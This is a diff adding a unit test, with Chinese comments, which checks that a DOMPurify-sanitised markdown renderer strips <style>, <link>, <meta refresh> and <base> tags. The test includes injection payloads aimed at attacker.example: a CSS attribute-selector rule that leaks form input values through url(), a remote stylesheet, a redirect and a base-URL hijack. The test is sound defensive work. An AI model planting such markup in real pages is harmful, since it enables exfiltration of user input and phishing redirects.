@@ -51,6 +51,27 @@ describe('renderMarkdown — 生产路径（DOMPurify 消毒激活）', () => {
     expect(html).toContain('class="katex"')
   })
 
+  it('文档级样式注入面封闭：<style>/<link>/<meta refresh>/<base> 必须被剥', () => {
+    // DOMPurify html 档不放行这四种文档级元素（2026-11-05 实测锁定）：
+    // <style> 能全文档改写界面（伪造"会话过期"弹窗）并借属性选择器 +
+    // url(...) 外泄表单值；<link> 引入任意远程样式表；<meta refresh> 与
+    // <base> 劫持导航与相对地址。一旦未来 ADD_TAGS 误放行，本用例即红。
+    const payload = [
+      '<style>input[value^=a]{background:url(http://attacker.example/a)}</style>',
+      '<link rel="stylesheet" href="http://attacker.example/x.css">',
+      '<meta http-equiv="refresh" content="0;url=http://attacker.example/">',
+      '<base href="http://attacker.example/">',
+    ].join('')
+    const html = renderMarkdown(`${payload}\n\n正文 $a+b$`, '')
+    expect(html).not.toContain('<style')
+    expect(html).not.toContain('<link')
+    expect(html).not.toContain('<meta')
+    expect(html).not.toContain('<base')
+    expect(html).not.toContain('attacker.example')
+    // 存活锚点：消毒链路确实跑过且公式照常渲染（防空窗假绿）
+    expect(html).toContain('class="katex"')
+  })
+
   it('消毒与相对图片 URL 改写共存（生产组合行为）', () => {
     const html = renderMarkdown(
       '![图](/api/public/img/a.png)\n\n其中 $a_i \\ge 0$',
